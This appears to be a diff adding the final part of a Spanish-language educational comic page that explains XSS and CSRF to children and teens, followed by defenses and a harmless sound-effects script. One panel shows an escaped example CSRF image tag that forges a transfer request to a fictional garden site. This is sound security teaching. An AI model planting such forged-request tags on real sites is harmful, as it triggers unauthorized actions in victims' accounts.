+      <div class="kids-text">Cuando Lila hace clic, ¡sin querer le ordena a su castillo que regale sus flores a Tela! El castillo obedece porque cree que fue Lila. 💙</div>
+    </div>
+  </div>
+  <div class="analogy-box csrf reveal">
+    <span class="analogy-icon">📝</span>
+    <div class="analogy-text">
+      <div class="analogy-title blue">🌟 ¿Lo entiendes así?</div>
+      <div class="analogy-desc">Es como si alguien firmara una carta con TU nombre pidiendo que te sacaran todos los dulces de tu mochila. ¡Tú nunca firmaste! Pero el profe cree que sí porque parece tu letra. 😮</div>
+    </div>
+  </div>
+</div>
+
+<!-- Teen CSRF detailed -->
+<div class="for-teen">
+  <div class="panels wide-left reveal">
+    <div class="panel p-dark">
+      <span class="p-num">08</span>
+      <span class="scene-tag tag-dark">El otro villano</span>
+      <span class="char xl anim-float">🕷️</span>
+      <div class="sfx md cream" style="margin-top:6px">Tela la Tramposa</div>
+      <div class="bubble villain notail" style="margin-top:10px">
+        Yo no necesito robar nada. Hago que TÚ misma muevas tus flores... sin saberlo 🕸️
+      </div>
+    </div>
+    <div class="panel p-teal">
+      <span class="p-num">09</span>
+      <span class="scene-tag tag-teal">¿Qué es CSRF?</span>
+      <p class="txt"><b>CSRF</b> ocurre cuando un sitio malicioso hace que el navegador de la víctima envíe una petición a un sitio legítimo. Como la cookie de sesión viaja automáticamente, el servidor cree que la orden es válida.</p>
+      <div class="caption-box cap-teal" style="margin-top:12px">
+        🕸️ Tela crea una página con una imagen cuya URL es una petición de transferencia. Cuando Lila carga esa página, el navegador "pide" esa URL... con las cookies de Lila adjuntas.
+      </div>
+    </div>
+  </div>
+
+  <div class="panels three reveal">
+    <div class="panel p-sage">
+      <span class="p-num">10</span>
+      <span class="scene-tag tag-green">Paso 1 — La trampa</span>
+      <span class="char anim-wobble">🕷️</span>
+      <p class="txt">Tela crea una página falsa con:</p>
+      <div class="code" style="font-size:.72rem">
+&lt;img src="jardín.com<br>
+/transferir<br>
+?flores=500<br>
+&destino=tela"&gt;
+      </div>
+    </div>
+    <div class="panel p-sky">
+      <span class="p-num">11</span>
+      <span class="scene-tag tag-sky">Paso 2 — El clic</span>
+      <span class="char anim-pulse">🧚</span>
+      <div class="bubble" style="font-size:.88rem">¡Qué bonito anuncio! Voy a hacer clic... 🌸</div>
+      <p class="txt" style="margin-top:10px">El navegador de Lila carga la imagen, disparando una petición GET al jardín <b>con su cookie automáticamente adjunta</b>.</p>
+    </div>
+    <div class="panel p-blush">
+      <span class="p-num">12</span>
+      <span class="scene-tag tag-rust">Paso 3 — El engaño</span>
+      <span class="char">🏡</span>
+      <p class="txt">El servidor recibe la petición con cookie válida y ejecuta la transferencia. No puede saber que Lila no la autorizó conscientemente.</p>
+      <span class="sfx md rust" style="margin-top:8px">¡Transferido! 🕸️</span>
+    </div>
+  </div>
+</div>
+
+<!-- ══ COMPARE ══ -->
+<div class="chapter-header reveal">
+  <span class="chapter-icon">⚖️</span>
+  <div class="chapter-label lilac">¿En qué se diferencian?</div>
+  <div class="chapter-rule lilac"></div>
+</div>
+
+<!-- Kids compare -->
+<div class="for-kids" style="display:none">
+  <div class="kids-story reveal">
+    <div class="kids-panel xss-k">
+      <span class="kids-icon">🍄</span>
+      <div class="kids-title rust">XSS — Moho</div>
+      <div class="kids-text">Esconde una trampa <b>dentro</b> del jardín. La trampa roba tu tarjeta mágica cuando pasas cerca.</div>
+    </div>
+    <div class="kids-panel csrf-k">
+      <span class="kids-icon">🕷️</span>
+      <div class="kids-title blue">CSRF — Tela</div>
+      <div class="kids-text">Manda una carta trampa <b>desde fuera</b>. Te hace hacer cosas sin que tú lo decidas.</div>
+    </div>
+  </div>
+</div>
+
+<!-- Teen compare -->
+<div class="for-teen">
+  <div class="compare-row reveal">
+    <div class="compare-card rust">
+      <div class="compare-title rust">🍄 XSS — Moho</div>
+      <ul class="compare-list">
+        <li>Inyecta código en la página legítima</li>
+        <li>Roba cookies y datos del DOM</li>
+        <li>Ataca desde <b>dentro</b> del sitio</li>
+        <li>La víctima solo <b>visita</b> la página</li>
+        <li>Necesita que el servidor no sanitice</li>
+      </ul>
+    </div>
+    <div class="compare-vs">VS</div>
+    <div class="compare-card teal">
+      <div class="compare-title teal">🕷️ CSRF — Tela</div>
+      <ul class="compare-list">
+        <li>No inyecta código, forja peticiones</li>
+        <li>Realiza acciones no autorizadas</li>
+        <li>Ataca desde un sitio <b>externo</b></li>
+        <li>La víctima <b>hace clic</b> en algo</li>
+        <li>Necesita que el servidor confíe en cookies</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ DEFENSE ══ -->
+<div class="chapter-header reveal">
+  <span class="chapter-icon">🛡️</span>
+  <div class="chapter-label green">Capítulo 3 — Los Guardianes del Jardín</div>
+  <p class="chapter-desc for-teen">Cuatro hechizos que los desarrolladores usan para proteger los jardines digitales</p>
+  <p class="chapter-desc for-kids" style="display:none">¡Cuatro amigos mágicos llegan para proteger el jardín de Lila! 🌟</p>
+  <div class="chapter-rule green"></div>
+</div>
+
+<!-- Kids defense -->
+<div class="for-kids" style="display:none">
+  <div class="step-flow reveal">
+    <div class="step-item safe">
+      <div class="step-num safe">1</div>
+      <div class="step-body">
+        <div class="step-title">🧹 El Guardián Limpiador</div>
+        <div class="step-desc">Revisa todos los mensajes antes de guardarlos. Si encuentra una trampa de Moho, ¡la convierte en texto inofensivo! Como lavar las manos antes de comer.</div>
+      </div>
+      <span class="step-emoji">🧹</span>
+    </div>
+    <div class="step-item safe">
+      <div class="step-num safe">2</div>
+      <div class="step-body">
+        <div class="step-title">🔑 El Guardián de la Llave Secreta</div>
+        <div class="step-desc">Cada vez que Lila hace algo importante, usa una llave supersecreta que solo ella conoce. Tela no sabe la llave, ¡así que sus cartas trampa no funcionan!</div>
+      </div>
+      <span class="step-emoji">🔑</span>
+    </div>
+    <div class="step-item safe">
+      <div class="step-num safe">3</div>
+      <div class="step-body">
+        <div class="step-title">🔒 El Guardián del Sobre Sellado</div>
+        <div class="step-desc">Todos los mensajes viajan en un sobre mágico sellado (HTTPS). Aunque Moho intente espiar el camino, solo ve garabatos sin sentido.</div>
+      </div>
+      <span class="step-emoji">🔒</span>
+    </div>
+    <div class="step-item safe">
+      <div class="step-num safe">4</div>
+      <div class="step-body">
+        <div class="step-title">🌿 El Guardián del Cofre Invisible</div>
+        <div class="step-desc">La tarjeta mágica de Lila se guarda en un cofre que el código malvado NO puede abrir. ¡Moho puede intentarlo, pero el cofre es invisible para él!</div>
+      </div>
+      <span class="step-emoji">🌿</span>
+    </div>
+  </div>
+</div>
+
+<!-- Teen defense -->
+<div class="for-teen">
+  <div class="panels one reveal">
+    <div class="panel p-mushroom" style="min-height:0;padding:16px 20px">
+      <span class="scene-tag tag-orange">¡Los guardianes aparecen!</span>
+      <div style="display:flex;justify-content:center;gap:24px;flex-wrap:wrap;padding:10px 0;position:relative;z-index:1">
+        <div style="text-align:center"><span class="char anim-float" style="font-size:3rem">🧹</span><div style="font-family:'Baloo 2',cursive;font-size:.9rem;font-weight:800;color:var(--moss)">Sanitizar</div></div>
+        <div style="text-align:center"><span class="char anim-float" style="font-size:3rem;animation-delay:.3s">🔑</span><div style="font-family:'Baloo 2',cursive;font-size:.9rem;font-weight:800;color:#2a6e8a">Token CSRF</div></div>
+        <div style="text-align:center"><span class="char anim-float" style="font-size:3rem;animation-delay:.6s">🔒</span><div style="font-family:'Baloo 2',cursive;font-size:.9rem;font-weight:800;color:#8a5a10">HTTPS</div></div>
+        <div style="text-align:center"><span class="char anim-float" style="font-size:3rem;animation-delay:.9s">🌿</span><div style="font-family:'Baloo 2',cursive;font-size:.9rem;font-weight:800;color:#5a3a9a">HttpOnly</div></div>
+      </div>
+      <span class="sfx lg moss" style="margin-top:4px">¡Al rescate! 🌱</span>
+    </div>
+  </div>
+  <div class="defense-grid reveal" style="margin-top:14px">
+    <div class="defense-card sage">
+      <span class="defense-icon">🧹</span>
+      <div class="defense-name sage">Sanitizar entradas</div>
+      <div class="defense-desc">El servidor escapa o elimina etiquetas HTML peligrosas antes de guardarlas. <code>&lt;script&gt;</code> se convierte en <code>&amp;lt;script&amp;gt;</code>, texto inofensivo.</div>
+      <div class="code safe" style="margin-top:8px;font-size:.7rem">&lt;script&gt; → &amp;lt;script&amp;gt; ✅</div>
+    </div>
+    <div class="defense-card sky">
+      <span class="defense-icon">🔑</span>
+      <div class="defense-name sky">Token CSRF</div>
+      <div class="defense-desc">Cada formulario incluye un token aleatorio secreto. El servidor lo verifica al recibir la petición. Los sitios externos no conocen ese token, así que sus peticiones son rechazadas.</div>
+    </div>
+    <div class="defense-card peach">
+      <span class="defense-icon">🔒</span>
+      <div class="defense-name peach">HTTPS</div>
+      <div class="defense-desc">Cifra toda la comunicación. Aunque Moho intercepte el tráfico de red, solo ve datos encriptados ilegibles. Esencial para proteger cookies en tránsito.</div>
+    </div>
+    <div class="defense-card lilac">
+      <span class="defense-icon">🌿</span>
+      <div class="defense-name lilac">Cookie HttpOnly</div>
+      <div class="defense-desc">La cookie de sesión se marca como HttpOnly: JavaScript no puede leerla. Aunque XSS logre ejecutar código, <code>document.cookie</code> no devuelve nada útil.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ FINAL ══ -->
+<div class="panels two reveal" style="margin-top:14px">
+  <div class="panel p-dark">
+    <span class="scene-tag tag-dark">Los villanos derrotados</span>
+    <div style="display:flex;justify-content:center;gap:20px;margin:10px 0;position:relative;z-index:1">
+      <div style="text-align:center;opacity:.45">
+        <span class="char anim-wobble" style="font-size:2.5rem">🦠</span>
+        <div style="font-family:'Baloo 2',cursive;font-size:.82rem;color:#f9d4a0">Moho... bloqueado</div>
+      </div>
+      <div style="text-align:center;opacity:.45">
+        <span class="char anim-wobble" style="font-size:2.5rem;animation-delay:.4s">🕷️</span>
+        <div style="font-family:'Baloo 2',cursive;font-size:.82rem;color:#f9d4a0">Tela... rechazada</div>
+      </div>
+    </div>
+    <div class="bubble villain notail">¡Nuestros planes fallaron! 😤</div>
+  </div>
+  <div class="panel p-sage">
+    <span class="char lg anim-pulse">🧚</span>
+    <span class="sfx md moss">¡El jardín está salvo!</span>
+    <div class="bubble" style="margin-top:10px">
+      ¡Con los cuatro guardianes mis flores-datos están protegidas para siempre! 🌺🌸
+    </div>
+  </div>
+</div>
+
+<!-- finale -->
+<div class="finale reveal">
+  <span class="char xl anim-float" style="margin-bottom:12px">🌺</span>
+  <div class="finale-title">¡Tú también puedes ser guardián!</div>
+  <p class="finale-sub for-teen">Conocer cómo funcionan los ataques es el primer paso para defenderte. Estos son los conceptos clave que aprendiste hoy.</p>
+  <p class="finale-sub for-kids" style="display:none">¡Ya conoces los trucos de Moho y Tela! Ahora puedes cuidar tu jardín digital. 🌿</p>
+
+  <div class="card-grid" style="max-width:700px;margin:0 auto">
+    <div class="card" style="text-align:center;border-color:rgba(192,97,58,.3)">
+      <span class="card-icon">🍄</span>
+      <div class="card-title" style="color:var(--rust)">XSS</div>
+      <span class="for-teen">Código trampa inyectado en páginas. Roba cookies al visitar el sitio.</span>
+      <span class="for-kids" style="display:none">Trampa escondida dentro del jardín 🌑</span>
+    </div>
+    <div class="card" style="text-align:center;border-color:rgba(91,191,181,.3)">
+      <span class="card-icon">🕷️</span>
+      <div class="card-title" style="color:#2a7a74">CSRF</div>
+      <span class="for-teen">Peticiones falsas enviadas desde otro sitio. Te usan a ti como mensajero.</span>
+      <span class="for-kids" style="display:none">Carta trampa desde fuera del jardín 🕸️</span>
+    </div>
+    <div class="card" style="text-align:center;border-color:rgba(143,175,126,.4)">
+      <span class="card-icon">🛡️</span>
+      <div class="card-title" style="color:var(--moss)">Defensa</div>
+      <span class="for-teen">Sanitizar, tokens CSRF, HTTPS y cookies HttpOnly juntos son invencibles.</span>
+      <span class="for-kids" style="display:none">¡Cuatro guardianes para protegerte! 🌟</span>
+    </div>
+  </div>
+
+  <div class="tip-pills">
+    <span class="pill big">🔒 Usa sitios con candado</span>
+    <span class="pill big">🦋 Cierra sesión al terminar</span>
+    <span class="pill big">🌿 No hagas clic en links raros</span>
+    <span class="pill big">✨ Contraseñas distintas para cada jardín</span>
+  </div>
+  <p style="font-family:'Baloo 2',cursive;font-size:1.2rem;color:var(--soft-ink);margin-top:24px">
+    🍄 Fin de la historia... ¡pero el jardín siempre necesita guardianes! 🌿
+  </p>
+</div>
+
+</div><!-- /book -->
+
+<script>
+// ══════════════════════════════════════════
+//  🎵 SOUND ENGINE  (Web Audio API)
+// ══════════════════════════════════════════
+let audioCtx = null;
+let masterGain = null;
+let bgmNodes = [];          // active background-music oscillators
+let soundEnabled = false;   // starts OFF until user clicks the button
+let bgmRunning  = false;
+
+function getCtx() {
+  if (!audioCtx) {
+    audioCtx  = new (window.AudioContext || window.webkitAudioContext)();
+    masterGain = audioCtx.createGain();
+    masterGain.gain.value = 0.55;
+    masterGain.connect(audioCtx.destination);
+  }
+  return audioCtx;
+}
+
+/* ── low-level helpers ── */
+function osc(freq, type, startT, endT, gainPeak, ctx, dest) {
+  const o = ctx.createOscillator();
+  const g = ctx.createGain();
+  o.type = type;
+  o.frequency.setValueAtTime(freq, startT);
+  g.gain.setValueAtTime(0, startT);
+  g.gain.linearRampToValueAtTime(gainPeak, startT + 0.02);
+  g.gain.exponentialRampToValueAtTime(0.0001, endT);
+  o.connect(g); g.connect(dest);
+  o.start(startT); o.stop(endT);
+  return o;
+}
+
+function noise(durationSec, gainVal, ctx, dest) {
+  const bufSize = ctx.sampleRate * durationSec;
+  const buf  = ctx.createBuffer(1, bufSize, ctx.sampleRate);
+  const data = buf.getChannelData(0);
+  for (let i = 0; i < bufSize; i++) data[i] = Math.random() * 2 - 1;
+  const src = ctx.createBufferSource();
+  src.buffer = buf;
+  const g = ctx.createGain();
+  g.gain.setValueAtTime(gainVal, ctx.currentTime);
+  g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + durationSec);
+  src.connect(g); g.connect(dest);
+  src.start(); src.stop(ctx.currentTime + durationSec);
+}
+
+/* ── SFX library ── */
+const SFX = {
+  // happy pop – page load / mode switch
+  pop() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    osc(520, 'sine', t,      t+0.12, 0.25, ctx, masterGain);
+    osc(780, 'sine', t+0.06, t+0.20, 0.18, ctx, masterGain);
+    osc(1040,'sine', t+0.12, t+0.28, 0.12, ctx, masterGain);
+  },
+  // magical sparkle – panels reveal
+  sparkle() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    [880,1100,1320,1760].forEach((f,i)=>{
+      osc(f,'sine', t+i*0.06, t+i*0.06+0.18, 0.1, ctx, masterGain);
+    });
+  },
+  // dark thud – villain panels
+  thud() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    osc(80,  'sawtooth', t,      t+0.35, 0.3,  ctx, masterGain);
+    osc(60,  'square',   t+0.02, t+0.3,  0.2,  ctx, masterGain);
+    noise(0.18, 0.15, ctx, masterGain);
+  },
+  // coin / badge sound – defense cards
+  coin() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    osc(660, 'sine', t,      t+0.1,  0.2,  ctx, masterGain);
+    osc(990, 'sine', t+0.08, t+0.22, 0.15, ctx, masterGain);
+  },
+  // alarm / warning – XSS attack
+  alarm() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    for (let i=0;i<4;i++) {
+      osc(440,'square', t+i*0.12,   t+i*0.12+0.08, 0.18, ctx, masterGain);
+      osc(554,'square', t+i*0.12+0.06, t+i*0.12+0.14, 0.15, ctx, masterGain);
+    }
+  },
+  // web/trap – CSRF
+  web() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    osc(220,'sine', t,      t+0.5,  0.15, ctx, masterGain);
+    osc(330,'sine', t+0.1,  t+0.6,  0.1,  ctx, masterGain);
+    osc(165,'triangle',t+0.2,t+0.7, 0.12, ctx, masterGain);
+  },
+  // victory fanfare
+  fanfare() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    const melody = [523,659,784,1047];
+    melody.forEach((f,i)=>{
+      osc(f,'sine', t+i*0.14, t+i*0.14+0.18, 0.22, ctx, masterGain);
+    });
+    osc(523,'sine', t+0.6, t+1.0, 0.28, ctx, masterGain);
+  },
+  // mode-switch whoosh
+  whoosh() {
+    if (!soundEnabled) return;
+    const ctx = getCtx(); const t = ctx.currentTime;
+    const o = ctx.createOscillator();
+    const g = ctx.createGain();
+    o.type = 'sawtooth';
+    o.frequency.setValueAtTime(800, t);
+    o.frequency.exponentialRampToValueAtTime(200, t+0.25);
+    g.gain.setValueAtTime(0.18, t);
+    g.gain.exponentialRampToValueAtTime(0.0001, t+0.25);
+    o.connect(g); g.connect(masterGain);
+    o.start(t); o.stop(t+0.26);
+  }
+};
+
+/* ── background music: gentle looping garden melody ── */
+function startBGM() {
+  if (!soundEnabled || bgmRunning) return;
+  bgmRunning = true;
+  const ctx = getCtx();
+  // simple arpeggio loop using setTimeout
+  const notes = [261,329,392,523,392,329,261,220];  // C major arpeggio
+  let step = 0;
+  function tick() {
+    if (!bgmRunning || !soundEnabled) return;
+    const t = ctx.currentTime;
+    const freq = notes[step % notes.length];
+    osc(freq, 'sine', t, t+0.28, 0.04, ctx, masterGain);
+    step++;
+    bgmNodes._timer = setTimeout(tick, 320);
+  }
+  tick();
+}
+function stopBGM() {
+  bgmRunning = false;
+  clearTimeout(bgmNodes._timer);
+}
+
+/* ── sound toggle button ── */
+function toggleSound() {
+  soundEnabled = !soundEnabled;
+  const btn = document.getElementById('sound-btn');
+  if (soundEnabled) {
+    getCtx();
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+    btn.textContent = '🔊 Sonido ON';
+    btn.classList.add('sound-on');
+    startBGM();
+    SFX.pop();
+  } else {
+    btn.textContent = '🔇 Sonido OFF';
+    btn.classList.remove('sound-on');
+    stopBGM();
+  }
+}
+
+// ══════════════════════════════════════════
+//  MODE SWITCHER
+// ══════════════════════════════════════════
+function setMode(mode) {
+  const body = document.body;
+  const btnKids = document.getElementById('btn-kids');
+  const btnTeen = document.getElementById('btn-teen');
+  SFX.whoosh();
+
+  if (mode === 'kids') {
+    body.classList.remove('teen-mode');
+    body.classList.add('kids-mode');
+    btnKids.classList.add('active-kids');
+    btnKids.classList.remove('kids');
+    btnTeen.classList.remove('active-teen');
+    btnTeen.classList.add('teen');
+  } else {
+    body.classList.remove('kids-mode');
+    body.classList.add('teen-mode');
+    btnTeen.classList.add('active-teen');
+    btnTeen.classList.remove('teen');
+    btnKids.classList.remove('active-kids');
+    btnKids.classList.add('kids');
+  }
+}
+
+// ══════════════════════════════════════════
+//  SCROLL REVEAL  +  contextual SFX
+// ══════════════════════════════════════════
+const revealedPanels = new WeakSet();
+
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (!e.isIntersecting) return;
+    e.target.classList.add('visible');
+    e.target.querySelectorAll('.panel,.defense-card,.card,.kids-panel,.step-item').forEach((el,i)=>{
+      el.style.transitionDelay = `${i * 0.07}s`;
+    });
+
+    // play contextual sound based on panel content
+    if (revealedPanels.has(e.target)) return;
+    revealedPanels.add(e.target);
+
+    const txt = e.target.textContent || '';
+    if (txt.includes('Moho') && txt.includes('villano'))      setTimeout(()=>SFX.thud(), 200);
+    else if (txt.includes('Tela') && txt.includes('villano')) setTimeout(()=>SFX.web(),  200);
+    else if (txt.includes('Al rescate') || txt.includes('guardianes')) setTimeout(()=>SFX.fanfare(), 200);
+    else if (txt.includes('Cookie robada') || txt.includes('¡Robada')) setTimeout(()=>SFX.alarm(), 100);
+    else if (txt.includes('Sanitizar') || txt.includes('Token CSRF'))  setTimeout(()=>SFX.coin(),   150);
+    else if (txt.includes('salvo') || txt.includes('Victoria'))        setTimeout(()=>SFX.fanfare(),200);
+    else setTimeout(()=>SFX.sparkle(), 80);
+  });
+}, { threshold: 0.09 });
+
+document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+
+// interactive panel clicks
+document.addEventListener('click', e => {
+  const panel = e.target.closest('.panel, .kids-panel, .defense-card');
+  if (panel) SFX.pop();
+});
+</script>
+</body>
+</html>
